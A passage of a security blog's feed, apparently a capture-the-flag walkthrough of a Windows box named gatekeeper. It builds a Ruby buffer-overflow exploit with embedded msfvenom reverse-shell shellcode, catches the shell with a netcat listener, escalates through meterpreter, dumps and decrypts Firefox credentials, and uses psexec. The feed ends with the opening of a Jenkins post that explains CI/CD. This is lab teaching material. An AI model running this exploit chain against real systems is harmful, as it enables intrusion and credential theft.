+445/tcp   open  microsoft-ds
+3389/tcp  open  ms-wbt-server
+31337/tcp open  Elite
+49152/tcp open  unknown
+49153/tcp open  unknown
+49154/tcp open  unknown
+49155/tcp open  unknown
+49161/tcp open  unknown
+49165/tcp open  unknown
+</code></pre><p>drilling down on the open ports with a more specific nmap scan:</p>
+<pre tabindex="0"><code>nmap -p135,139,445,3389,31337 -A 10.10.10.172
+</code></pre><p>right away, i can identify an SMB service running on port 445. the next step should be second nature at this point: enumerate the SMB shares.</p>
+<pre tabindex="0"><code>smbclient -L 10.10.10.172
+</code></pre><p>although this command can yield some decent information, i&rsquo;ve recently come to prefer using nmap to execute an SMB enumeration script:</p>
+<pre tabindex="0"><code>nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.10.172
+
+PORT    STATE SERVICE
+445/tcp open  microsoft-ds
+
+Host script results:
+| smb-enum-shares: 
+|   account_used: guest
+|   \\10.10.10.172\ADMIN$: 
+|     Type: STYPE_DISKTREE_HIDDEN
+|     Comment: Remote Admin
+|     Anonymous access: &lt;none&gt;
+|     Current user access: &lt;none&gt;
+|   \\10.10.10.172\C$: 
+|     Type: STYPE_DISKTREE_HIDDEN
+|     Comment: Default share
+|     Anonymous access: &lt;none&gt;
+|     Current user access: &lt;none&gt;
+|   \\10.10.10.172\IPC$: 
+|     Type: STYPE_IPC_HIDDEN
+|     Comment: Remote IPC
+|     Anonymous access: READ
+|     Current user access: READ/WRITE
+|   \\10.10.10.172\Users: 
+|     Type: STYPE_DISKTREE
+|     Comment: 
+|     Anonymous access: &lt;none&gt;
+|_    Current user access: READ
+</code></pre><p><img src="/gatekeeper_smb.jpg" alt="SMB"></p>
+<p>the &ldquo;users&rdquo; share looks interesting, so i logged into it:</p>
+<pre tabindex="0"><code>smbclient \\\\10.10.10.172\\Users
+</code></pre><p>upon executing <code>dir</code>, i see there&rsquo;s a file called &ldquo;gatekeeper.exe&rdquo;. to download it to my local machine, i simply execute <code>smbget smb://10.10.10.172/Users/Share/gatekeeper.exe</code></p>
+<p>at this point, i fire up a windows VM i&rsquo;d created for the purposes of reverse engineering and creating proof-of-concepts for buffer overflow attacks. i then transfer &ldquo;gatekeeper.exe&rdquo; to my windows VM using the python simplehttpserver. once it&rsquo;s downloaded to my windows machine, i open and run it in immunity debugger, a powerful application used to analyze malware and reverse engineer binary files.</p>
+<p>before i do anything else with immunity debugger, i need to find the port that gatekeeper is running on. inside the windows command prompt, i first find the process ID (PID) of the program and then use that to find the port.</p>
+<pre tabindex="0"><code>tasklist | findstr gatekeeper.exe
+</code></pre><p><img src="/gatekeeper_PID.png" alt="PID"></p>
+<pre tabindex="0"><code>netstat -aon | findstr 5148
+</code></pre><p><img src="/gatekeeper_netstat.png" alt="netstat"></p>
+<p>the program is running on port 31337.</p>
+<p>now that we know which port the program is running on, and while it&rsquo;s running inside immunity debugger (which will delineate all the memory operations of the program), i return to my kali machine to create a simple exploit that will supply gatekeeper with my inputs. if the program successfully receives my input, i&rsquo;ll then try to crash it with a large string and if that also works, i&rsquo;ll work on a proper payload that will not only break the program but force it to execute my exploit in adjacent memory.</p>
+<p>i prefer writing overflow exploits in ruby (it&rsquo;s a fun new language that i&rsquo;ve been learning), so for the simple exploit i&rsquo;ll use a runtime dev console called <code>pry</code>. this can be run directly inside the terminal.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span>pry <span style="color:#f92672">--</span>simple<span style="color:#f92672">-</span>prompt
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;</span> require <span style="color:#e6db74">&#34;socket&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;</span> s<span style="color:#f92672">=</span><span style="color:#66d9ef">TCPSocket</span><span style="color:#f92672">.</span>new(<span style="color:#e6db74">&#34;192.168.100.4&#34;</span>,<span style="color:#ae81ff">31337</span>)
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;</span> s<span style="color:#f92672">.</span>puts <span style="color:#e6db74">&#34;hello&#34;</span>
+</span></span></code></pre></div><p>this little piece of code opens a socket to the program running in windows (addressed at 192.168.100.4) on port 31337. it then &ldquo;puts&rdquo; a string (hello) as the input.</p>
+<p><img src="/gatekeeper_hello.png" alt="hello"></p>
+<p>the program received our 6 bytes of input. now i&rsquo;m going to try and crash it. instead of &ldquo;hello&rdquo;, i&rsquo;ll send a string of As. 200 of them, to be exact.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span>pry <span style="color:#f92672">--</span>simple<span style="color:#f92672">-</span>prompt
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;</span> require <span style="color:#e6db74">&#34;socket&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;</span> s<span style="color:#f92672">=</span><span style="color:#66d9ef">TCPSocket</span><span style="color:#f92672">.</span>new(<span style="color:#e6db74">&#34;192.168.100.4&#34;</span>,<span style="color:#ae81ff">31337</span>)
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;</span> s<span style="color:#f92672">.</span>puts <span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">200</span>
+</span></span></code></pre></div><p><img src="/gatekeeper_A200.png" alt="A"></p>
+<p>the program crashed, which means buffer overflow is possible!</p>
+<p>to do this, i need to calculate something called the &ldquo;EIP offset&rdquo;. EIP stands for extended instruction pointer, and it tells the computer where to go to execute the next command. it basically controls the flow of a program. the EIP offset is then the exact number of bytes in the payload after which the EIP gets overwritten. to find the EIP offset, i&rsquo;ll first create a string with which to crash the program, and then observe the EIP in immunity debugger.</p>
+<pre tabindex="0"><code>msf-pattern_create -l 200
+
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+</code></pre><p>i&rsquo;ll paste this string (200 characters long) into the pry:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span>pry <span style="color:#f92672">--</span>simple<span style="color:#f92672">-</span>prompt
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;</span> require <span style="color:#e6db74">&#34;socket&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;</span> s<span style="color:#f92672">=</span><span style="color:#66d9ef">TCPSocket</span><span style="color:#f92672">.</span>new(<span style="color:#e6db74">&#34;192.168.100.4&#34;</span>,<span style="color:#ae81ff">31337</span>)
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;</span> s<span style="color:#f92672">.</span>puts <span style="color:#e6db74">&#34;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag&#34;</span>
+</span></span></code></pre></div><p><img src="/gatekeeper_EIP.png" alt="EIP"></p>
+<p>the EIP is pointed at 39654138. i can use this to find the offset:</p>
+<pre tabindex="0"><code>msf-pattern_offset -l 2500 -q 39654138
+
+exact match at offset 146
+</code></pre><p>to verify this offset value, i&rsquo;ll create an input that will enter A for the first 146 bytes, and then B for the next 4.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span>pry <span style="color:#f92672">--</span>simple<span style="color:#f92672">-</span>prompt
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;</span> require <span style="color:#e6db74">&#34;socket&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;</span> s<span style="color:#f92672">=</span><span style="color:#66d9ef">TCPSocket</span><span style="color:#f92672">.</span>new(<span style="color:#e6db74">&#34;192.168.100.4&#34;</span>,<span style="color:#ae81ff">31337</span>)
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;</span> s<span style="color:#f92672">.</span>puts <span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">146</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;B&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">4</span>
+</span></span></code></pre></div><p><img src="/gatekeeper_B.png" alt="B"></p>
+<p>the EIP is now overwritten with &ldquo;42424242&rdquo;, which is &ldquo;BBBB&rdquo; in hex.</p>
+<p>so, i know the program is exploitable, along with the EIP offset value. i can now write the proof-of-concept of my exploit. what i&rsquo;m trying to do is not simply crash the program, but inject a payload (&ldquo;shellcode&rdquo;) that will spawn a reverse shell that i can then use to further exploit the target machine. the skeleton of the script, called <strong>bof.rb</strong>, looks as follows:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span>buff <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x90</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">146</span> <span style="color:#75715e">#NOP slide, forces the program to start right after the offset.</span>
+</span></span><span style="display:flex;"><span>buff<span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;&#34;</span> <span style="color:#75715e">#JMP ESP</span>
+</span></span><span style="display:flex;"><span>buff<span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;B&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">10</span> <span style="color:#75715e">#additional nops for argument values</span>
+</span></span><span style="display:flex;"><span>buff<span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;&#34;</span> <span style="color:#75715e">#shellcode</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>require <span style="color:#e6db74">&#39;socket&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">TCPSocket</span><span style="color:#f92672">.</span>open(<span style="color:#e6db74">&#34;&lt;targetIP&#34;</span>,<span style="color:#ae81ff">31337</span>){ <span style="color:#f92672">|</span>s<span style="color:#f92672">|</span> s<span style="color:#f92672">.</span>puts buff}
+</span></span></code></pre></div><p>the ESP register is the stack pointer, which will execute the contents of the stack. now that i have control of the EIP register, i need it to somehow point to the ESP. this is where JMP ESP comes in. JMP ESP basically jumps to the desired ESP.</p>
+<p>the shellcode section is where my payload will go. before i create a payload, i need to find the &ldquo;bad characters&rdquo;. certain byte characters cause issues in exploit development. a couple common bad characters are x00 (null byte: truncates the shellcode when executed) and x0a (carriage return). to find all possible bad characters, i&rsquo;ll just write a list of all hex characters (excluding x00 and x0a).</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span>buff<span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;&#34;</span>\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f<span style="color:#e6db74">&#34; +
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span>\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40<span style="color:#e6db74">&#34; +
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span>\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f<span style="color:#e6db74">&#34; +
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span>\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f<span style="color:#e6db74">&#34; +
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span>\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f<span style="color:#e6db74">&#34; +
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span>\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf<span style="color:#e6db74">&#34; +
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span>\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf<span style="color:#e6db74">&#34; +
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span>\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff<span style="color:#e6db74">&#34;&#34;</span>
+</span></span></code></pre></div><p>i&rsquo;ll run the exploit using <code>ruby bof.rb</code> and then in immunity debugger, compare against a byte array to isolate the bad characters. note the ESP when the exploit terminates: 008D19E4.</p>
+<pre tabindex="0"><code>!mona bytearray -b &#34;\x00\x01\x02\x03\x04&#34;
+!mona compare -f C:\mona\gatekeeper\bytearray.txt 008D19E4
+</code></pre><p><img src="/gatekeeper_badchars.png" alt="badchars"></p>
+<p>i used an expanded array from x00 to x04, and the results show that x0a is the first corrupted byte. that means the only bad characters i have are x00 and x0a.</p>
+<p>before i move on, i must verify if ASLR (address space randomization) is turned off. the attack will not work otherwise.</p>
+<pre tabindex="0"><code>!mona modules
+</code></pre><p>ASLR is set to &ldquo;false&rdquo;, so i can proceed with finding the JMP ESP values.</p>
+<pre tabindex="0"><code>!mona jmp -r esp -m gatekeeper.exe
+</code></pre><p><img src="/gatekeeper_esp.png" alt="ESP"></p>
+<p>i get back 2 pointers: 0x080414c3 and 0x080416bf. i&rsquo;ll use the former, but for my script i have to convert it to <a href="https://en.wikipedia.org/wiki/Endianness">little endian</a> format, which stores the least significant byte at the smallest memory address.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span>buff<span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xc3\x14\x04\x08</span><span style="color:#e6db74">&#34;</span>
+</span></span></code></pre></div><p>for the actual shellcode, i&rsquo;ll use msfvenom.</p>
+<pre tabindex="0"><code>msfvenom -p windows/shell_reverse_tcp LHOST=&lt;local IP&gt; LPORT=4444 -f rb -b &#34;\x00\x0a&#34;
+</code></pre><p><img src="/gatekeeper_shellcode.png" alt="shellcode"></p>
+<p>the code for bof.rb is now complete!</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span>buff <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x90</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">146</span> <span style="color:#75715e">#NOP slide, forces the program to start right after the offset.</span>
+</span></span><span style="display:flex;"><span>buff<span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xc3\x14\x04\x08</span><span style="color:#e6db74">&#34;</span> <span style="color:#75715e">#JMP ESP</span>
+</span></span><span style="display:flex;"><span>buff<span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;B&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">10</span> <span style="color:#75715e">#additional NOPs for argument values</span>
+</span></span><span style="display:flex;"><span>buff<span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;&#34;</span>\xdb\xc8\xb8\xf3\x0f\xd1\xd9\xd9\x74\x24\xf4\x5d\x29\xc9<span style="color:#e6db74">&#34; +
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span>\xb1\x52\x83\xc5\x04\x31\x45\x13\x03\xb6\x1c\x33\x2c\xc4<span style="color:#e6db74">&#34; +
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span>\xcb\x31\xcf\x34\x0c\x56\x59\xd1\x3d\x56\x3d\x92\x6e\x66<span style="color:#e6db74">&#34; +
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span>\x35\xf6\x82\x0d\x1b\xe2\x11\x63\xb4\x05\x91\xce\xe2\x28<span style="color:#e6db74">&#34; +
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span>\x22\x62\xd6\x2b\xa0\x79\x0b\x8b\x99\xb1\x5e\xca\xde\xac<span style="color:#e6db74">&#34; +
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span>\x93\x9e\xb7\xbb\x06\x0e\xb3\xf6\x9a\xa5\x8f\x17\x9b\x5a<span style="color:#e6db74">&#34; +
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span>\x47\x19\x8a\xcd\xd3\x40\x0c\xec\x30\xf9\x05\xf6\x55\xc4<span style="color:#e6db74">&#34; +
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span>\xdc\x8d\xae\xb2\xde\x47\xff\x3b\x4c\xa6\xcf\xc9\x8c\xef<span style="color:#e6db74">&#34; +
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span>\xe8\x31\xfb\x19\x0b\xcf\xfc\xde\x71\x0b\x88\xc4\xd2\xd8<span style="color:#e6db74">&#34; +
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span>\x2a\x20\xe2\x0d\xac\xa3\xe8\xfa\xba\xeb\xec\xfd\x6f\x80<span style="color:#e6db74">&#34; +
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span>\x09\x75\x8e\x46\x98\xcd\xb5\x42\xc0\x96\xd4\xd3\xac\x79<span style="color:#e6db74">&#34; +
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span>\xe8\x03\x0f\x25\x4c\x48\xa2\x32\xfd\x13\xab\xf7\xcc\xab<span style="color:#e6db74">&#34; +
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span>\x2b\x90\x47\xd8\x19\x3f\xfc\x76\x12\xc8\xda\x81\x55\xe3<span style="color:#e6db74">&#34; +
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span>\x9b\x1d\xa8\x0c\xdc\x34\x6f\x58\x8c\x2e\x46\xe1\x47\xae<span style="color:#e6db74">&#34; +
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span>\x67\x34\xc7\xfe\xc7\xe7\xa8\xae\xa7\x57\x41\xa4\x27\x87<span style="color:#e6db74">&#34; +
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span>\x71\xc7\xed\xa0\x18\x32\x66\xc5\xce\x30\x4a\xb1\xec\x48<span style="color:#e6db74">&#34; +
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span>\xa7\xf2\x78\xae\xad\xe4\x2c\x79\x5a\x9c\x74\xf1\xfb\x61<span style="color:#e6db74">&#34; +
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span>\xa3\x7c\x3b\xe9\x40\x81\xf2\x1a\x2c\x91\x63\xeb\x7b\xcb<span style="color:#e6db74">&#34; +
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span>\x22\xf4\x51\x63\xa8\x67\x3e\x73\xa7\x9b\xe9\x24\xe0\x6a<span style="color:#e6db74">&#34; +
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span>\xe0\xa0\x1c\xd4\x5a\xd6\xdc\x80\xa5\x52\x3b\x71\x2b\x5b<span style="color:#e6db74">&#34; +
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span>\xce\xcd\x0f\x4b\x16\xcd\x0b\x3f\xc6\x98\xc5\xe9\xa0\x72<span style="color:#e6db74">&#34; +
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span>\xa4\x43\x7b\x28\x6e\x03\xfa\x02\xb1\x55\x03\x4f\x47\xb9<span style="color:#e6db74">&#34; +
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span>\xb2\x26\x1e\xc6\x7b\xaf\x96\xbf\x61\x4f\x58\x6a\x22\x7f<span style="color:#e6db74">&#34; +
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span>\x13\x36\x03\xe8\xfa\xa3\x11\x75\xfd\x1e\x55\x80\x7e\xaa<span style="color:#e6db74">&#34; +
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span>\x26\x77\x9e\xdf\x23\x33\x18\x0c\x5e\x2c\xcd\x32\xcd\x4d<span style="color:#e6db74">&#34; +
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span>\xc4<span style="color:#e6db74">&#34;&#34;</span> <span style="color:#75715e">#shellcode</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>require <span style="color:#e6db74">&#39;socket&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">TCPSocket</span><span style="color:#f92672">.</span>open(<span style="color:#e6db74">&#34;10.10.10.172&#34;</span>,<span style="color:#ae81ff">31337</span>){ <span style="color:#f92672">|</span>s<span style="color:#f92672">|</span> s<span style="color:#f92672">.</span>puts buff}
+</span></span></code></pre></div><p>before executing this script, i&rsquo;ll set up a netcat listener that can receive the reverse shell.</p>
+<p><code>nc -lvnp 4444</code></p>
+<p>if, for whatever reason, the port is clogged, i can simply hard kill the process running on it:</p>
+<pre tabindex="0"><code>kill -9 $(lsof -t -i:4444)
+</code></pre><p>execute the script using <code>ruby bof.rb</code> and a shell will have spawned in the netcat session. the flag is stored on the desktop.</p>
+<p><img src="/gatekeeper_natbat.png" alt="natbat"></p>
+<p>a quick check of the user&rsquo;s privileges shows that i don&rsquo;t have any special access, so here comes the privilege escalation portion of the challenge.</p>
+<p><img src="/gatekeeper_whoami.png" alt="whoami"></p>
+<p>i&rsquo;ll create another shellcode, but this time i want to upgrade it to a meterpreter shell.</p>
+<pre tabindex="0"><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;local IP&gt; LPORT=5555 -f rb -b &#34;\x00\x0a&#34;
+</code></pre><p>in another terminal window, i&rsquo;ll run the metasploit console to run the handler.</p>
+<p><img src="/gatekeeper_handler.png" alt="handler"></p>
+<p>running the exploit using <code>exploit -j</code> and running my overflow script on the side using <code>ruby bof.rb</code>, a reverse shell will be spawned. once the meterpreter shell is spawned, i&rsquo;ll try to enumerate the applications on the target.</p>
+<pre tabindex="0"><code>&gt; run post/windows/gather/enum_applications
+
+Installed Applications
+======================
+
+ Name                                                                Version
+ ----                                                                -------
+ Amazon SSM Agent                                                    2.3.842.0
+ Amazon SSM Agent                                                    2.3.842.0
+ EC2ConfigService                                                    4.9.4222.0
+ EC2ConfigService                                                    4.9.4222.0
+ EC2ConfigService                                                    4.9.4222.0
+ EC2ConfigService                                                    4.9.4222.0
+ Microsoft Visual C++ 2015-2019 Redistributable (x64) - 14.20.27508  14.20.27508.1
+ Microsoft Visual C++ 2015-2019 Redistributable (x64) - 14.20.27508  14.20.27508.1
+ Microsoft Visual C++ 2015-2019 Redistributable (x86) - 14.20.27508  14.20.27508.1
+ Microsoft Visual C++ 2015-2019 Redistributable (x86) - 14.20.27508  14.20.27508.1
+ Microsoft Visual C++ 2019 X86 Additional Runtime - 14.20.27508      14.20.27508
+ Microsoft Visual C++ 2019 X86 Additional Runtime - 14.20.27508      14.20.27508
+ Microsoft Visual C++ 2019 X86 Minimum Runtime - 14.20.27508         14.20.27508
+ Microsoft Visual C++ 2019 X86 Minimum Runtime - 14.20.27508         14.20.27508
+ Mozilla Firefox 75.0 (x86 en-US)                                    75.0
+</code></pre><p>i see firefox is downloaded, which means i can dump its credentials and then use <a href="https://github.com/unode/firefox_decrypt">firefox decrypt</a> to decrypt them, allowing me to impersonate and log in as the target.</p>
+<pre tabindex="0"><code>&gt; run post/multi/gather/firefox_creds
+
+[+] Downloaded cert9.db: /home/kali/.msf4/loot/20211021043407_default_10.10.10.172_ff.ljfn812a.cert_898397.bin
+[+] Downloaded cookies.sqlite: /home/kali/.msf4/loot/20211021043411_default_10.10.10.172_ff.ljfn812a.cook_582398.bin
+[+] Downloaded key4.db: /home/kali/.msf4/loot/20211021043414_default_10.10.10.172_ff.ljfn812a.key4_936123.bin
+[+] Downloaded logins.json: /home/kali/.msf4/loot/20211021043416_default_10.10.10.172_ff.ljfn812a.logi_001670.bin
+</code></pre><p>i have to move the files from /.msf4/ to whichever folder i&rsquo;m working with, before running firefox_dcrypt.
+but also, before i run firefox_dcrypt, i must rename each of the &ldquo;loot&rdquo; files to the corresponding names:</p>
+<pre tabindex="0"><code>mv 20211021043407_default_10.10.248.88_ff.ljfn812a.cert_898397.bin cert9.db
+mv 20211021043411_default_10.10.248.88_ff.ljfn812a.cook_582398.bin cookies.sqlite
+mv 20211021043414_default_10.10.248.88_ff.ljfn812a.key4_936123.bin key4.db
+mv 20211021043416_default_10.10.248.88_ff.ljfn812a.logi_001670.bin logins.json
+</code></pre><p>running the tool, i get:</p>
+<pre tabindex="0"><code>python3 firefox_decrypt.py /home/kali/gatekeeper/firefoxcreds/loot
+Username: &#39;mayor&#39;
+Password: &#39;8CL7O1N78MdrCIsV&#39;
+</code></pre><p>so i have an elevated account&rsquo;s credentials. i can run psexec.py (which lets me execute programs on remote systems) using these credentials, effectively granting me special access.</p>
+<pre tabindex="0"><code>python3 psexec.py mayor:8CL7O1N78MdrCIsV@10.10.10.172
+</code></pre><p>as demonstrated, buffer overflows are incredibly powerful attack vectors that utilize deep understanding of how memory storage and program execution work in tandem. stopping them is not only difficult and potentially expensive, but necessary.</p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>jenkins</title>
+            <link>/posts/2022/01/jenkins/</link>
+            <pubDate>Sat, 08 Jan 2022 14:37:40 -0500</pubDate>
+            
+            <guid>/posts/2022/01/jenkins/</guid>
+            <description>if you&amp;rsquo;ve worked in any sort of SaaS/tech company, odds are you&amp;rsquo;ve used a CI/CD (continuous integration/continuous delivery and deployment) and DevOps tool. CI/CD is a method used to deliver apps to customers and clients by introducing automation into the stages of app development. it allows orgs to ship software &amp;ldquo;quickly&amp;rdquo; and &amp;ldquo;efficiently&amp;rdquo; (i used scare quotes because&amp;hellip;well, if you&amp;rsquo;ve worked in a software company you&amp;rsquo;ll know why). i&amp;rsquo;m going to see if i can try to exploit a common security misconfiguration on one of these tools, jenkins, then try to escalate privilege to get full system access.</description>
+            <content type="html"><![CDATA[<p>if you&rsquo;ve worked in any sort of SaaS/tech company, odds are you&rsquo;ve used a CI/CD (continuous integration/continuous delivery and deployment) and DevOps tool. CI/CD is a method used to deliver apps to customers and clients by introducing automation into the stages of app development. it allows orgs to ship software &ldquo;quickly&rdquo; and &ldquo;efficiently&rdquo; (i used scare quotes because&hellip;well, if you&rsquo;ve worked in a software company you&rsquo;ll know why). i&rsquo;m going to see if i can try to exploit a common security misconfiguration on one of these tools, jenkins, then try to escalate privilege to get full system access.</p>
+<h2 id="the-difference-between-ci-and-cd">the difference between CI and CD</h2>
+<p><strong>CI</strong>: involves devs making small changes and checks to their code. the scale of these changes can be huge so the process is automated to ensure that teams can build, test, and package their apps in a reliable way. CI can also help to streamline code changes.</p>
+<p><strong>CD (continuous delivery)</strong>: this is the automated delivery of completed code to environments like testing and development.</p>
+<p><strong>CD (continuous deployment)</strong>: every change that passes the automated tests is automatically placed in production, resulting in many production deployments. this is the ultimate goal of many companies, given they&rsquo;re not constrained by regulatory or compliance requirements.</p>
